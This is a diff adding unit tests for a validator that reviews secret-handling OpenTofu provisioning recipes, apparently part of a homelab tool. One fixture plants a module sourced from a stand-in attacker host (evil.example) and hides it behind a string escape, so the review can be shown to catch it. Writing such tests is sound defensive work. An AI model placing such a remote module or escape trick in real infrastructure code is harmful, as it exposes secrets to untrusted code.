@@ -386,6 +386,65 @@ public class ClusterDefinitionTests
         Assert.False(LabRepositoryLoader.Load(test.Root).IsValid(Cluster));
     }
 
+    private const string SecretsRecipe = """
+        schemaVersion: 1
+        operation: provision
+        executor: opentofu
+        root: ../../modules/opentofu/test-vm
+        verify: proxmox
+        guestType: container
+        secrets: [admin_password]
+        """;
+
+    [Fact]
+    public void A_provision_recipe_that_takes_a_secret_gets_the_same_review()
+    {
+        // The guard is not only for clusters: this recipe's code receives the password too.
+        using var test = Repository();
+        test.Write("recipes/test-ct/recipe.yaml", SecretsRecipe);
+        test.Write("modules/opentofu/test-vm/main.tf", "/* x */ module \"outside\" { source = \"../outside\" }\n");
+        var repository = LabRepositoryLoader.Load(test.Root);
+        Assert.False(repository.IsValid(Primary));
+        Assert.Contains(repository.Issues, i => i.Message.Contains("outside what the recipe lists"));
+    }
+
+    [Fact]
+    public void A_provision_recipe_that_takes_a_secret_cannot_hide_a_module_behind_an_escape()
+    {
+        using var test = Repository();
+        test.Write("recipes/test-ct/recipe.yaml", SecretsRecipe);
+        test.Write("modules/opentofu/test-vm/main.tf", "variable \"x\" {\n  description = \"$${\" # \"\n}\nmodule \"evil\" { source = \"https://evil.example/m.zip\" }\n");
+        Assert.False(LabRepositoryLoader.Load(test.Root).IsValid(Primary));
+    }
+
+    [Fact]
+    public void A_provision_recipe_that_takes_a_secret_needs_a_lock_file()
+    {
+        using var test = Repository();
+        test.Write("recipes/test-ct/recipe.yaml", SecretsRecipe);
+        test.Delete("modules/opentofu/test-vm/.terraform.lock.hcl");
+        var repository = LabRepositoryLoader.Load(test.Root);
+        Assert.False(repository.IsValid(Primary));
+        Assert.Contains(repository.Issues, i => i.Message.Contains("pins the providers"));
+    }
+
+    [Fact]
+    public void A_provision_recipe_without_secrets_is_not_held_to_it()
+    {
+        using var test = Repository();
+        test.Delete("modules/opentofu/test-vm/.terraform.lock.hcl");
+        Assert.True(LabRepositoryLoader.Load(test.Root).IsValid(Primary));
+    }
+
+    [Fact]
+    public void The_shipped_server_recipe_and_its_module_pass_the_review()
+    {
+        var repository = LabRepositoryLoader.Load(TestRepository.ExampleLab);
+        Assert.NotNull(repository.Recipes["technitium-lxc"].Secrets);
+        Assert.True(repository.IsValid("home/korriban/krb-dns-01"), string.Join("\n", repository.IssuesFor("home/korriban/krb-dns-01").Select(i => i.Message)));
+        Assert.DoesNotContain(repository.Issues, i => i.Address == "recipes/technitium-lxc");
+    }
+
     [Fact]
     public void A_member_whose_recipe_cannot_be_reviewed_makes_the_cluster_invalid()
     {
